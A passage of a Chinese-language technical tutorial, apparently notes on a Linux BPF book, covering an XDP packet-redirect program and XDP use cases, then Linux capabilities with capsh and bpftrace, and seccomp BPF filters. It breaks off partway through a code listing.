class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KBUILD_MODNAME <span class="meta-string">"kmyprogram"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myprogram</span><span class="params">(struct xdp_md *ctx)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ipsize = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data;</span><br><span class="line">  <span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data_end;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ethhdr</span> *<span class="title">eth</span> = <span class="title">data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">ip</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> *<span class="title">th</span>;</span></span><br><span class="line"></span><br><span class="line">  ipsize = <span class="keyword">sizeof</span>(*eth);</span><br><span class="line">  ip = data + ipsize;</span><br><span class="line">  ipsize += <span class="keyword">sizeof</span>(struct iphdr);</span><br><span class="line">  <span class="keyword">if</span> (data + ipsize &gt; data_end) &#123;</span><br><span class="line">    <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ip-&gt;protocol == IPPROTO_TCP) &#123;</span><br><span class="line">    th = (struct tcphdr *)(ip + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">void</span> *)(th + <span class="number">1</span>) &gt; data_end) &#123;</span><br><span class="line">      <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (th-&gt;dest == htons(<span class="number">9090</span>)) &#123;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">0</span>] = <span class="number">0x08</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">1</span>] = <span class="number">0x00</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">2</span>] = <span class="number">0x27</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">3</span>] = <span class="number">0xdd</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">4</span>] = <span class="number">0x38</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">5</span>] = <span class="number">0x2a</span>;</span><br><span class="line">      <span class="keyword">return</span> XDP_TX;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> XDP_PASS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在可以运行我们的测试程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos prog-test-run]# python3 test_xdp.py</span><br><span class="line">...</span><br><span class="line">    --------------------------------</span><br><span class="line">    Ran 3 tests in 4.676s</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><h3 id="XDP用例"><a href="#XDP用例" class="headerlink" title="XDP用例"></a>XDP用例</h3><h4 id="监控"><a href="#监控" class="headerlink" title="监控"></a>监控</h4><p>现在，大多数网络监控系统要么通过编写内核模块来实现，要么通过从用户空间访问<code>proc</code>文件来实现。 编写、分发和编译内核模块并不是每个人的任务。 它们也不容易维护和调试。 然而，替代方案可能更糟。 要获得相同类型的信息，例如一张卡在一秒钟内收到多少个数据包，您需要打开并分割一个文件，在本例中是 <code>/sys/class/net/eth0/statistics/rx_packets</code>。 这似乎是一个好主意，但它需要大量的计算才能获得一些简单的信息，因为在某些情况下使用开放系统调用并不便宜。</p><p>因此我们需要一个解决方案，能够实现与内核模块类似的功能，而不会损失性能。XDP是完美的，因为我们可以使用XDP程序发送我们想要在映射中提取的数据。然后映射被加载器使用，加载器可以将指标存储到存储后端并对其应用算法或将结果绘制在图中。</p><h4 id="缓解DDoS"><a href="#缓解DDoS" class="headerlink" title="缓解DDoS"></a>缓解DDoS</h4><p>能够在NIC级别查看数据包可确保在第一阶段拦截任何可能的数据包，此时系统尚未花费足够的计算能力来了解数据包是否对系统有用。在典型的场景中，<code>bpf map</code>可以指示XDP程序从某个源<code>XDP_DROP</code>数据包。在分析通过另一个映射接收到的数据包之后，可以在用户空间中生成该数据包列表。一旦流入XDP程序的数据包与列表中的元素匹配，就会发生缓解。 数据包被丢弃，内核甚至不需要花费一个CPU周期来处理它。这导致攻击者的目标难以实现，因为在这种情况下，它无法浪费任何昂贵的计算资源。</p><h4 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h4><p>XDP程序的一个有趣用例是负载平衡。 但是，XDP只能在数据包到达的同一个NIC上重新传输数据包。这意味着XDP不是实现经典负载均衡器的最佳选择，该负载均衡器位于所有服务器之前并将流量转发给它们。但是，这并不意味着XDP不适合这个用例。 如果我们将负载平衡从外部服务器转移到为应用程序提供服务的同一台机器上，则可以看到NIC是如何完成这项工作。</p><p>通过这种方式，我们可以创建一个分布式负载均衡器，其中每台托管应用程序的机器都有助于将流量分散到适当的服务器。</p><h4 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h4><p>当人们想到Linux上的防火墙时，通常会想到<code>iptables</code>或网络过滤器。 使用XDP可以直接在NIC或其驱动程序中以完全可编程的方式获得相同的功能。通常，防火墙是位于网络堆栈顶部或节点之间的昂贵机器，用于控制其通信。然而，当使用XDP时，因为XDP程序非常便宜和快速，我们可以将防火墙逻辑直接实现到节点的NIC中，而不是使用一组专用机器。一个常见的用例是有一个XDP加载器来控制一个映射，其中包含一组通过远程过程调用API更改的规则。 然后，映射中的一组规则会动态地传递给加载到每台特定机器中的XDP程序，以控制它可以接收什么、从谁以及在什么情况下接收。</p><p>这种替代方案不仅降低了防火墙成本； 它还允许每个节点部署自己的防火墙级别，而无需依赖用户空间软件或内核来执行此操作。当使用<code>offloaded</code>的XDP作为操作模式进行部署时会有更大优势，因为处理甚至不需要主节点CPU完成。</p><h3 id="结论-2"><a href="#结论-2" class="headerlink" title="结论"></a>结论</h3><p>从现在开始，XDP将帮助你以一种完全不同的方式思考网络流。处理网络数据包时不得不依赖<code>iptables</code>或其他用户空间工具等工具令人沮丧。XDP则很有趣，因为它具有直接的数据包处理能力，因此速度更快，而且你可以编写自己的逻辑来处理网络数据包。因为所有这些代码都可以与映射一起使用并与其他BPF程序交互。</p><h2 id="第八章节"><a href="#第八章节" class="headerlink" title="第八章节"></a>第八章节</h2><h3 id="Linux内核Security、Capabilities和Seccomp"><a href="#Linux内核Security、Capabilities和Seccomp" class="headerlink" title="Linux内核Security、Capabilities和Seccomp"></a>Linux内核Security、Capabilities和Seccomp</h3><p>BPF是一种在不影响稳定性、安全性和速度的情况下扩展内核的强大方法。出于这个原因，内核开发人员认为，通过实现由BPF 程序（也称为 Seccomp BPF）支持的<code>Seccomp</code>过滤器，利用其多功能性来改善 <code>Seccomp</code>中的进程隔离会是一件好事。在本章中，我们将研究<code>Seccomp</code>是什么以及如何使用它。 然后你会学习如何使用BPF程序编写<code>Seccomp</code>过滤器。 最后将探索内核为Linux安全模块提供的内置BPF挂钩。</p><p>Linux安全模块 (LSM) 是一个框架，它提供了一组功能，可用于以标准化方式实现不同的安全模型。LSM可以直接在内核源代码树中使用，例如<code>Apparmor、SELinux和Tomoyo</code></p><h3 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h3><p>Linux功能的处理是你需要为非特权进程提供执行特定任务的权限，但你不想将<code>suid</code>权限授予二进制文件或以其他方式使进程具有特权，因此只需通过减少攻击面赋予流程完成特定任务的特定能力。例如，如果你的应用程序需要打开一个特权端口，比如 80，而不是以root身份启动进程，你可以给它<code>CAP_NET_BIND_SERVICE</code>能力。</p><p>考虑如下<code>main.go</code>程序</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>(</span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line">  <span class="string">"log"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  log.Fatalf(<span class="string">"%v"</span>, http.ListenAndServe(<span class="string">":80"</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该程序在端口80（一个特权端口）上为HTTPserver提供服务。</p><p>我们通常会做的是在使用以下代码编译后直接运行该程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[elssm@VM-16-14-centos ~]$ go build -o capabilities main.go</span><br><span class="line">[elssm@VM-16-14-centos ~]$ ./capabilities</span><br><span class="line">2022/06/03 17:44:46 listen tcp :80: bind: permission denied</span><br></pre></td></tr></table></figure><p>但是，由于我们没有授予root权限，因此绑定端口时该代码会输出错误：</p><p>在这种情况下，如上所述，我们可以通过允许<code>cap_net_bind_service</code>功能以及程序已经拥有的所有其他功能来允许特权端口的绑定，而不是给予完全的root权限。 为此，我们可以使用<code>capsh</code>包装我们的程序运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt8]# capsh --caps='cap_net_bind_service+eip cap_setpcap,cap_setuid,cap_setgid+ep' --keep=1 --user="nobody" --addamb=cap_net_bind_service -- -c "./capabilities"</span><br></pre></td></tr></table></figure><p>capsh：使用capsh作为装饰器</p><p>—caps=’cap_net_bind_service+eip cap_setpcap,cap_setuid,cap_setgid+ep’：因为我们需要更改用户（我们不想以root身份运行），所以我们需要指定<code>cap_net_bind_service</code>以及实际将用户ID从root 更改为nobody的能力，即<code>cap_setuid</code>和<code>cap_setgid</code>：</p><p>—keep=1：当从root切换完成时，我们希望保留设置的功能</p><p>—user=’nobody’：运行我们程序的最终用户将是任何人</p><p>—addamb=cap_net_bind_service：我们设置了环境功能，因为这些功能在从root切换后会被清除。</p><p>— -c “./capabilities”：一切就绪，运行程序</p><p>此时你可能会问在<code>--caps</code>选项中的功能之后的<code>+eip</code>是什么：</p><ul><li>需要激活该功能(p)</li><li>该能力是可用的(e)</li><li>该能力可以由子进程继承(i)</li></ul><p>因为我们要使用我们的<code>cap_net_bind_service</code>，所以需要将它设为e； 然后在我们的命令中启动了一个 shell。启动了<code>capabilities</code>二进制文件，我们需要设置为i。 最后，我们希望使用p激活该功能(不是因为我们更改了 UID)。 最终成为<code>cap_net_bind_service+eip</code>。</p><p>您可以使用<code>ss</code>进行验证。 我们将剪切输出以使其适合此页面，但它会显示绑定端口和用户ID，而不是 0，在本例中为 65534：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# ss -tulpn -e -H | cut -d' ' -f17-</span><br><span class="line">*:80        *:* users:(("capabilities",pid=253996,fd=3)) uid:65534 ino:1512751 sk:6 cgroup:unreachable:1 v6only:0 &lt;-&gt;</span><br></pre></td></tr></table></figure><p>我们在本例中使用了<code>capsh</code>，你也可以使用<code>libcap</code>编写包装器；有关详细信息，请参阅<code>man 3 libcap</code></p><p>为了更好地理解我们程序使用的功能，我们可以使用BCC提供的功能工具，该工具在内核函数<code>cap_capable</code> 上设置<code>kprobe</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt8]# /usr/share/bcc/tools/capable</span><br><span class="line">TIME      UID    PID    COMM             CAP  NAME                 AUDIT </span><br><span class="line">18:29:12  0      258056 barad_agent      1    CAP_DAC_OVERRIDE     1     </span><br><span class="line">18:29:12  0      258056 barad_agent      1    CAP_DAC_OVERRIDE     1     </span><br><span class="line">18:29:20  0      1210   YDService        19   CAP_SYS_PTRACE       1            </span><br><span class="line">18:29:22  0      258074 barad_agent      1    CAP_DAC_OVERRIDE     1   </span><br><span class="line">18:29:39  0      258733 capabilities     10   CAP_NET_BIND_SERVICE 1</span><br></pre></td></tr></table></figure><p>我们可以使用<code>bpftrace</code>和<code>cap_capable</code>内核函数上的单线<code>kprobe</code>来完成相同的操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt8]# bpftrace -e \ 'kprobe:cap_capable &#123;time("%H:%M:%S  "); printf("%-6d %-6d %-16s %-4d %d\n", uid, pid, comm, arg2, arg3); &#125;' | grep -i capabilities</span><br><span class="line">18:35:30  0      259014 capabilities     21   2</span><br><span class="line">18:35:30  0      259014 capabilities     21   2</span><br><span class="line">18:35:30  0      259014 capabilities     21   2</span><br><span class="line">18:35:30  0      259014 capabilities     21   2</span><br><span class="line">18:35:30  0      259014 capabilities     21   2</span><br><span class="line">18:35:30  0      259014 capabilities     21   2</span><br><span class="line">18:35:30  0      259014 capabilities     21   2</span><br><span class="line">18:35:30  0      259014 capabilities     21   2</span><br></pre></td></tr></table></figure><p><code>Capabilities</code>通常用于容器运行时，如<code>runC</code>或<code>Docker</code>，以使容器无特权并仅允许运行大多数应用程序所需的功能。 当应用程序需要特定功能时，在<code>Docker</code>中可以使用<code>--cap-add</code>来完成：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm --cap-add=NET_ADMIN ubuntu ip link add dummy0 type dummy</span><br></pre></td></tr></table></figure><p>此命令将为该容器提供<code>CAP_NET_ADMIN</code>功能，允许它设置网络链接以添加<code>dummy0</code>接口。</p><p>下一节将展示如何实现过滤等功能，但要使用另一种技术，以编程方式实现自己的过滤器。</p><h3 id="Seccomp"><a href="#Seccomp" class="headerlink" title="Seccomp"></a>Seccomp</h3><p><code>Seccomp</code>代表安全计算，它是在Linux内核中实现的安全层，允许开发人员过滤特定的系统调用。尽管<code>Seccomp</code>可以与<code>capabilities</code>相媲美，但它控制特定系统调用的能力相比于<code>capabilities</code>更加灵活。</p><p><code>Seccomp</code>和<code>capabilities</code>不相互排斥； 它们经常一起使用 例如，你希望为进程提供<code>CAP_NET_ADMIN</code>功能，但不允许它通过阻止<code>accept</code>和<code>accept4</code>系统调用来接受套接字上的连接。</p><p><code>Seccomp</code>过滤器的方式基于<code>SECCOMP_MODE_FILTER</code>模式的BPF过滤器，并且系统调用过滤的完成方式与对数据包的过滤方式相同。</p><p><code>Seccomp</code>过滤器通过<code>PR_SET_SECCOMP</code>操作使用<code>prctl</code>加载；这些过滤器以BP 程序的形式表示，该程序在使用<code>seccomp_data</code>结构表示的每个<code>Seccomp</code>数据包上执行。该结构包含参考架构、系统调用时的CPU指令指针以及最多六个以<code>uint64</code>表示的系统调用参数。</p><p>以下是<code>seccomp_data</code>结构在<code>linux/seccomp.h</code>内核源码中的样子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_data</span> &#123;</span> </span><br><span class="line">  <span class="keyword">int</span> nr;</span><br><span class="line">  __u32 arch;</span><br><span class="line">  __u64 instruction_pointer;</span><br><span class="line">  __u64 args[<span class="number">6</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们可以基于系统调用、基于其参数或基于它们的组合进行过滤。</p><p>在接收到每个<code>Seccomp</code>数据包后，过滤器有责任进行处理以做出最终决定，告诉内核下一步该做什么。最终决定通过它可以给出的返回值（状态代码）之一表示，如下所述：</p><p>SECCOMP_RET_KILL_PROCESS：它会在过滤系统调用后立即终止整个进程，因此不会执行</p><p>SECCOMP_RET_KILL_THREAD：它会在过滤系统调用后立即终止当前线程，因此不会执行</p><p>SECCOMP_RET_KILL：这是SECCOMP_RET_KILL_THREAD的别名，以保持兼容性</p><p>SECCOMP_RET_TRAP：系统调用被禁止，SIGSYS信号被发送到调用它的任务</p><p>SECCOMP_RET_ERRNO：系统调用未执行，过滤器返回值的SECCOMP_RET_DATA部分作为<code>errno</code>值传递给用户空间。根据错误的原因，返回不同的<code>errno</code> </p><p>SECCOMP_RET_TRACE：这用于通知使用PTRACE_O_TRACESECCOMP的<code>ptrace</code>跟踪器在调用系统调用观察和控制系统调用执行时进行拦截。如果没有附加跟踪器，则返回错误，将<code>errno</code>设置为<code>-ENOSYS</code>，并且不执行系统调用</p><p>SECCOMP_RET_LOG：系统调用被允许并被记录</p><p>SECCOMP_RET_ALLOW：系统调用被允许</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptrace是一个系统调用，用于在进程上实现跟踪机制，称为tracee，其效果是能够观察和控制进程的执行。跟踪器程序可以有效地影响执行并更改被跟踪者的内存寄存器。在Seccomp的上下文中，ptrace在由SECCOMP_RET_TRACE状态码触发时使用；因此，跟踪器可以阻止系统调用执行并实现自己的逻辑。</span><br></pre></td></tr></table></figure><h4 id="Seccomp错误"><a href="#Seccomp错误" class="headerlink" title="Seccomp错误"></a>Seccomp错误</h4><p>有时，在使用<code>Seccomp</code>时会遇到由SECCOMP_RET_ERRNO类型的返回值给出的不同错误。为了通知发生错误，<code>seccomp</code>系统调用将返回-1而不是0。</p><p>可能的错误如下：</p><p>EACCESS：不允许调用者进行系统调用，这通常是因为它没有<code>CAP_SYS_ADMIN</code>权限或没有使用<code>prctl</code>设置 <code>no_new_privs</code></p><p>EFAULT：传递的参数（<code>seccomp_data</code>结构中的参数）没有有效地址</p><p>EINVAL：它可以有四种含义</p><ul><li>此内核在其当前配置中不知道或不支持请求的操作</li><li>指定的标志对请求的操作无效</li><li>操作包括<code>BPF_ABS</code>，但是指定的偏移量有问题，可能超过<code>seccomp_data</code>结构的大小</li><li>传递给过滤器的指令数超过了最大指令数</li></ul><p>ENOMEM：没有足够的内存来执行程序</p><p>EOPNOTSUPP：该操作使用SECCOMP_GET_ACTION_AVAIL指定，但实际上内核不支持参数中的返回操作</p><p>ESRCH：同步另一个线程时出现问题</p><p>ENOSYS：SECCOMP_RET_TRACE操作没有附着跟踪器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prctl是一个系统调用，它允许用户空间程序控制（设置和获取）进程的特定方面，例如字节序、线程名称、安全计算 (Seccomp) 模式、权限、Perf事件等。</span><br></pre></td></tr></table></figure><p><code>Seccomp</code>可能听起来像是一种沙盒机制，但事实并非如此。<code>Seccomp</code>是一个实用程序，可让其用户开发沙盒机制。接下来我们将介绍如何编写程序来使用<code>Seccomp</code>系统调用直接调用的过滤器来编写自定义交互。</p><h4 id="Seccomp-BPF过滤器示例"><a href="#Seccomp-BPF过滤器示例" class="headerlink" title="Seccomp BPF过滤器示例"></a>Seccomp BPF过滤器示例</h4><p>在此示例中，我们展示了如何将前面描述的两个操作放在一起：</p><ul><li>编写Seccomp BPF程序以用作过滤器，基于做出的决定返回不同的代码</li><li>使用<code>prctl</code>加载过滤器</li></ul><p>首先，该示例需要来自标准库和Linux内核的一些头文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/audit.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>在尝试执行这个例子之前，我们需要确保我们的内核已经将<code>CONFIG_SECCOMP</code>和 <code>CONFIG_SECCOMP_FILTER</code>设置为y。可以通过以下方式进行检查：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/config.gz| zcat | grep -i CONFIG_SECCOMP</span><br><span class="line">or</span><br><span class="line">cat /usr/src/kernels/&lt;linux-src&gt;/.config | grep -i CONFIG_SECCOMP</span><br></pre></td></tr></table></figure><p>其余代码是<code>install_filter</code>函数，由两部分组成。 第一部分包含BPF过滤指令列表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">install_filter</span><span class="params">(<span class="keyword">int</span> nr, <span class="keyword">int</span> arch, <span class="keyword">int</span> error)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] = &#123;</span></span><br><span class="line">    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(struct seccomp_data, arch))),</span><br><span class="line">    BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, arch, <span class="number">0</span>, <span class="number">3</span>),</span><br><span class="line">    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(struct seccomp_data, nr))),</span><br><span class="line">    BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, nr, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ERRNO | (error &amp; SECCOMP_RET_DATA)),</span><br><span class="line">    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>这些指令是使用<code>linux/filter.h</code>中定义的<code>BPF_STMT</code>和<code>BPF_JUMP</code>宏设置的。</p><p>让我们看一下说明：</p><p>BPF_STMT(BPF_LD + BPF_W + BPF_ABS (offsetof(struct seccomp_data, arch)))：以字<code>BPF_W</code>与<code>BPF_LD</code> 的形式一起加载和累加，并且数据包数据包含在固定的<code>BPF_ABS</code>偏移量中</p><p>BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, arch, 0, 3)：使用<code>BPF_JEQ</code>检查累加器常量<code>BPF_K</code>中的架构值是否等于<code>arch</code>。 如果是，它将以偏移量0跳转到下一条指令；否则，它将以偏移量3跳转并给出错误</p><p>BPF_STMT(BPF_LD + BPF_W + BPF_ABS (offsetof(struct seccomp_data, nr)))：以字<code>BPF_W</code>与<code>BPF_LD</code>的形式一起加载并累加，这是包含在固定<code>BPF_ABS</code>偏移处的系统调用数值数据</p><p>BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, nr, 0, 1)：将系统调用号中的值与nr变量中的值进行比较。如果相等，将转到下一条指令并禁止系统调用；否则将允许带有SECCOMP_RET_ALLOW的系统调用</p><p>BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ERRNO | (error &amp; SECCOMP_RET_DATA))：这将使用 <code>BPF_RET</code>终止程序并作为结果给出错误SEC COMP_RET_ERRNO，并带有来自<code>err</code>变量的指定错误号</p><p>BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW)：使用<code>BPF_RET</code>终止程序并允许使用 SECCOMP_RET_ALLOW执行系统调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">你可能会想为什么要使用指令列表而不是编译后的ELF对象或JIT编译的C程序？</span><br><span class="line">主要有两个原因</span><br><span class="line">1.首先是Seccomp使用cBPF（经典BPF）而不是eBPF，这意味着它没有注册表，而只是一个累加器来存储最后的计算结果。</span><br><span class="line">2.第二个是Seccomp直接接受一个指向BPF指令数组的指针，没有别的。我们使用的宏只是以一种友好的方式指定这些指令的助手。</span><br></pre></td></tr></table></figure><p>在<code>socket_filter</code>结构体中定义过滤器代码后，我们需要定义一个<code>sock_fprog</code>包含过滤器代码和过滤器本身的计算长度。需要此数据结构作为声明流程操作的参数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> = &#123;</span></span><br><span class="line">    .len = (<span class="keyword">unsigned</span> short)(<span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>])),</span><br><span class="line">    .filter = filter,</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>现在我们在<code>install_filter</code>函数中只剩一件事要做：加载程序本身！ 为此，我们使用PR_SET_SECCOMP 作为选项使用<code>prctl</code>，因为我们想进入安全计算模式。 然后我们指示模式使用SECCOMP_MODE_FILTER加载过滤器，该过滤器包含在我们的<code>sock_fprog</code>类型的<code>prog</code>变量中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog)) &#123;</span><br><span class="line">    perror(<span class="string">"prctl(PR_SET_SECCOMP)"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，我们可以利用<code>install_filter</code>函数，但是在使用它之前，我们需要使用<code>prctl</code>设置当前执行的 PR_SET_NO_NEW_PRIVS以避免子进程可以拥有比父进程更广泛的权限。这样我们可以在没有root权限的情况下在<code>install_filter</code>函数中进行<code>prctl</code>调用。</p><p>现在可以调用<code>install_filter</code>函数。 我们将阻止所有与X86-64体系结构相关的写入系统调用，并且只会授予拒绝所有尝试的权限。过滤器安装后，我们只需使用第一个参数继续执行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 